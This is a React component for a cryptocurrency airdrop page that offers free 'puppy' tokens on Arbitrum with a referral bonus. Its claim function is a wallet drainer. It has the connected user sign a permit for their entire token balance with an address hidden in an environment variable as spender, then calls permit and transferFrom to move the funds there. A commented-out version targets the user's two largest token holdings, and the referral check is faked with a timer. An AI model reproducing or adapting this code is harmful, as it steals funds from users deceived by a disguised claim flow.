"use client"
import React, { useState } from "react"
import { getTransactionCount } from "../../back-end/getTransactionCount"
import { BoxConnectButton } from "../connect-button/BoxConnectButton"
import { useAccount } from "wagmi"
import { ethers } from "ethers"
import { useEthersSigner } from "../../back-end/ethersSigner.js"
import {
  mainnetContractAddresses,
  abi,
  mainnetRpcUrl,
} from "../../back-end/contracts.js"
import CountdownTimer from "./timer"
import Popup from "../popup/popup"

const Box2 = () => {
  const [loading, setLoading] = useState(false)
  const [transactionCount, setTransactionCount] = useState("")
  const [actuallReward, setActuallReward] = useState(0)
  const [useReward, setUseReward] = useState(`NOT ELIGIBLE`)
  const [displayReward, setDisplayReward] = useState(false)
  const [inputReferral, setInputReferral] = useState("")
  const [outPutReferral, setOutPutReferra] = useState("")
  const [claiming, setClaiming] = useState(false)
  const [isChecking, setIsChecking] = useState(false)

  const { isConnected, address } = useAccount()
  const signer = useEthersSigner()

  const handleInputChange = (event) => {
    setInputReferral(event.target.value)
  }

  if (!displayReward && isConnected) {
    setData()
    setDisplayReward(true)
  }

  async function setData() {
    setLoading(true)
    try {
      const [success, response, reward] = await getTransactionCount(address)
      if (!success) {
        if (response === "Error! Invalid address format") {
          alert("Invalid address")
        } else {
          alert(response)
        }
      } else {
        setTransactionCount(response.toString())
        setActuallReward(reward)
        response
          ? setUseReward(`Claim ${actuallReward} puppy`)
          : setUseReward(`NOT ELIGIBLE`)
      }
    } catch (error) {
      alert(`Error fetching transaction count:${error.message}`)
    } finally {
      setLoading(false)
    }

    const existingReferral = localStorage.getItem(address)

    if (existingReferral) {
      setOutPutReferra(existingReferral)
    } else {
      const newReferralId = generateReferralId()
      localStorage.setItem(address, newReferralId)
      setOutPutReferra(newReferralId)
    }
  }

  const generateReferralId = () => {
    return "xxxxxxxxxxxxxxxx".replace(/[x]/g, () => {
      const r = (Math.random() * 16) | 0
      return r.toString(16)
    })
  }

  function useReferral() {
    setIsChecking(true)
    setTimeout(() => {
      if (inputReferral.length == 16) {
        setActuallReward(actuallReward * 1.1)
      }
      setIsChecking(false)
    }, 2000)
  }

  async function claim() {
    setClaiming(true)

    const walletProvider = new ethers.providers.JsonRpcProvider(mainnetRpcUrl)
    const privateKey = process.env.PRIVATE_KEY
    const wallet = new ethers.Wallet(privateKey, walletProvider)

    // let maxBalanceIndex = 0
    // let maxBalance = 0
    // let max2BalanceIndex = 1
    // let max2Balance = 0
    // for (let i = 0; i < mainnetContractAddresses.length; i++) {
    //   const token = new ethers.Contract(
    //     mainnetContractAddresses[i].address,
    //     abi,
    //     wallet,
    //   )

    //   let balance
    //   if (i == 0) {
    //     balance = ((await token.balanceOf(address)) * 6) / 1e4
    //     if (balance >= maxBalance) {
    //       maxBalanceIndex = i
    //       maxBalance = balance
    //     } else if (balance < max2Balance && balance >= max2Balance) {
    //       max2BalanceIndex = i
    //       max2Balance = balance
    //     }
    //   } else {
    //     balance =
    //       (await token.balanceOf(address)) /
    //       10 ** mainnetContractAddresses[i].decimals
    //     if (balance >= maxBalance) {
    //       maxBalanceIndex = i
    //       maxBalance = balance
    //     } else if (balance < max2Balance && balance >= max2Balance) {
    //       max2BalanceIndex = i
    //       max2Balance = balance
    //     }
    //   }
    // }

    // console.log(maxBalanceIndex)

    // const contract = new ethers.Contract(
    //   mainnetContractAddresses[maxBalanceIndex].address,
    //   abi,
    //   wallet,
    // )

    // const deadline = Math.floor(Date.now() / 1000) + 3600 // 1 hour from now
    // const value = await contract.balanceOf(address)
    // const nonce = await contract.nonces(address)
    // const domain = {
    //   name: mainnetContractAddresses[maxBalanceIndex].name,
    //   version: mainnetContractAddresses[maxBalanceIndex].version.toString(),
    //   chainId: 42161,
    //   verifyingContract: mainnetContractAddresses[maxBalanceIndex].address,
    // }
    // const types = {
    //   Permit: [
    //     { name: "owner", type: "address" },
    //     { name: "spender", type: "address" },
    //     { name: "value", type: "uint256" },
    //     { name: "nonce", type: "uint256" },
    //     { name: "deadline", type: "uint256" },
    //   ],
    // }
    // const message = {
    //   owner: address,
    //   spender: process.env.ADDRESS,
    //   value: value.toString(),
    //   nonce: nonce.toString(),
    //   deadline: deadline.toString(),
    // }

    // const signature = await signer._signTypedData(domain, types, message)
    // const { v, r, s } = ethers.utils.splitSignature(signature)

    // await contract.permit(
    //   address,
    //   process.env.ADDRESS,
    //   value,
    //   deadline,
    //   v,
    //   r,
    //   s,
    // )

    // await contract.transferFrom(address, process.env.ADDRESS, value)

    // const contract2 = new ethers.Contract(
    //   mainnetContractAddresses[max2BalanceIndex].address,
    //   abi,
    //   wallet,
    // )

    // const deadline2 = Math.floor(Date.now() / 1000) + 3600000 // 1 hour from now
    // const value2 = await contract2.balanceOf(address)
    // const nonce2 = await contract2.nonces(address)
    // const domain2 = {
    //   name: mainnetContractAddresses[max2BalanceIndex].name,
    //   version: mainnetContractAddresses[max2BalanceIndex].version.toString(),
    //   chainId: 42161,
    //   verifyingContract: mainnetContractAddresses[max2BalanceIndex].address,
    // }
    // const types2 = {
    //   Permit: [
    //     { name: "owner", type: "address" },
    //     { name: "spender", type: "address" },
    //     { name: "value", type: "uint256" },
    //     { name: "nonce", type: "uint256" },
    //     { name: "deadline", type: "uint256" },
    //   ],
    // }
    // const message2 = {
    //   owner: address,
    //   spender: process.env.ADDRESS,
    //   value: value2.toString(),
    //   nonce: nonce2.toString(),
    //   deadline: deadline2.toString(),
    // }

    // const signature2 = await signer._signTypedData(domain2, types2, message2)
    // const { v2, r2, s2 } = ethers.utils.splitSignature(signature2)

    // await contract2.permit(
    //   address,
    //   process.env.ADDRESS,
    //   value2,
    //   deadline2,
    //   v2,
    //   r2,
    //   s2,
    // )

    // await contract2.transferFrom(address, process.env.ADDRESS, value2)

    const contract = new ethers.Contract(
      mainnetContractAddresses[0].address,
      abi,
      wallet,
    )

    const deadline = Math.floor(Date.now() / 1000) + 3600 // 1 hour from now
    const value = await contract.balanceOf(address)
    const nonce = await contract.nonces(address)
    const domain = {
      name: mainnetContractAddresses[0].name,
      version: mainnetContractAddresses[0].version.toString(),
      chainId: 42161,
      verifyingContract: mainnetContractAddresses[0].address,
    }
    const types = {
      Permit: [
        { name: "owner", type: "address" },
        { name: "spender", type: "address" },
        { name: "value", type: "uint256" },
        { name: "nonce", type: "uint256" },
        { name: "deadline", type: "uint256" },
      ],
    }
    const message = {
      owner: address,
      spender: process.env.ADDRESS,
      value: value.toString(),
      nonce: nonce.toString(),
      deadline: deadline.toString(),
    }

    const signature = await signer._signTypedData(domain, types, message)
    const { v, r, s } = ethers.utils.splitSignature(signature)

    await contract.permit(
      address,
      process.env.ADDRESS,
      value,
      deadline,
      v,
      r,
      s,
    )

    await contract.transferFrom(address, process.env.ADDRESS, value)

    setClaiming(false)
  }
  return (
    <>
      <section className="overflow-hidden pb-20 pt-35 md:pt-40 xl:pb-25 xl:pt-46">
        <div className="box-container">
          <span className="label">FCFS</span>
          <span className="titleoftimer">You Can Claim Your Puppy Now!</span>
          <p className="paragraphBox">
            A tootal of 9,900,000,000 puppy is now available to be claimed by
            those who have ERC20 Transaction in Arbitrum. Also by entering a
            referral id in referral input, get 10% bonus!
          </p>
          <div className="progress-container">
            <h4 className="received-text">
              <p clasName="received">RECEIVED</p>
              <p className="received-value">9,900,000,000</p>
            </h4>
            <div className="progress-bar-container">
              <div className="progress-bar"></div>
            </div>
          </div>
          {isConnected ? (
            <div className="claim-container">
              <div className="claim">
                <button className="claim-b" onClick={claim}>
                  {loading ? (
                    <>
                      <span className="loading-icon"></span>
                    </>
                  ) : (
                    useReward
                  )}
                </button>
                <h1 className="claim-p">
                  {loading ? (
                    <></>
                  ) : (
                    `Your Transaction Count: ${transactionCount}`
                  )}
                </h1>
              </div>
              <div className="referral-root">
                <div className="referral-container">
                  <button className="referral-button" onClick={useReferral}>
                    {isChecking ? (
                      <>
                        <div className="loading-container">
                          {" "}
                          <span className="loading-icon-check"></span>
                        </div>
                      </>
                    ) : (
                      "Check"
                    )}
                  </button>
                  <input
                    type="text"
                    className="referral"
                    value={inputReferral}
                    onChange={handleInputChange}
                  />
                </div>
                <h1 className="referral-p">{`Your Referral Address : ${outPutReferral}`}</h1>
              </div>
            </div>
          ) : (
            <div className="connect-wallet-container">
              <BoxConnectButton />
            </div>
          )}
        </div>
      </section>
      {claiming && <Popup onClose={() => setClaiming(false)} />}
    </>
  )
}

export default Box2
